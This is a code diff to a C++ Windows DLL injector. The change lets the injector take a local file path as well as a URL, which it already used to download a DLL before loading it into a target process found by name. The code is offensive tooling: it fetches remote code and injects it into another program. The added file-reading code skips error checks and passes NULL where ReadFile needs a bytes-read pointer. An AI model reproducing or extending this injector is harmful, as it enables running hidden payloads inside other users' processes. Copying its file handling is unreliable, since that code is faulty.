@@ -322,7 +322,7 @@ PVOID remoteDownloadDll(LPCSTR dllUrl, DWORD& dllSize) {
 }
 
 
-int injector(LPCSTR dllUrl, LPCSTR processName, bool waitWindow = false)
+int injector(LPCSTR dllPathOrUrl, LPCSTR processName, bool remoteDll, bool waitWindow = false)
 {
 
 	DWORD ProcessId = FindProcessId(processName);
@@ -354,7 +354,22 @@ int injector(LPCSTR dllUrl, LPCSTR processName, bool waitWindow = false)
 		// Download Remote DLL
 		DWORD dllSize;
 
-		PVOID FileBuffer = remoteDownloadDll(dllUrl, dllSize);
+		PVOID FileBuffer = nullptr;
+
+		if (remoteDll)
+		{
+			FileBuffer = remoteDownloadDll(dllPathOrUrl, dllSize);
+		}
+		else
+		{
+			HANDLE hFile = CreateFileA(dllPathOrUrl, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL); // Open the DLL
+
+			DWORD FileSize = GetFileSize(hFile, NULL);
+			FileBuffer = VirtualAlloc(NULL, FileSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+
+			// Read the DLL
+			ReadFile(hFile, FileBuffer, FileSize, NULL, NULL);
+		}
 
 		// Target Dll's DOS Header
 		PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)FileBuffer;
@@ -416,7 +431,7 @@ int injector(LPCSTR dllUrl, LPCSTR processName, bool waitWindow = false)
 		std::cout << RED << "[-] Error with dll injection." << RESET << std::endl;
 		std::cout << RED << "[-] Error: " << e.what() << RESET << std::endl;
 		std::cout << YELLOW << "[!] Process Id: " << ProcessId << RESET << std::endl;
-		std::cout << YELLOW << "[!] DLL URL: " << dllUrl << RESET << std::endl;
+		std::cout << YELLOW << "[!] DLL URL: " << dllPathOrUrl << RESET << std::endl;
 		
 		return EXIT_FAILURE;
 	}
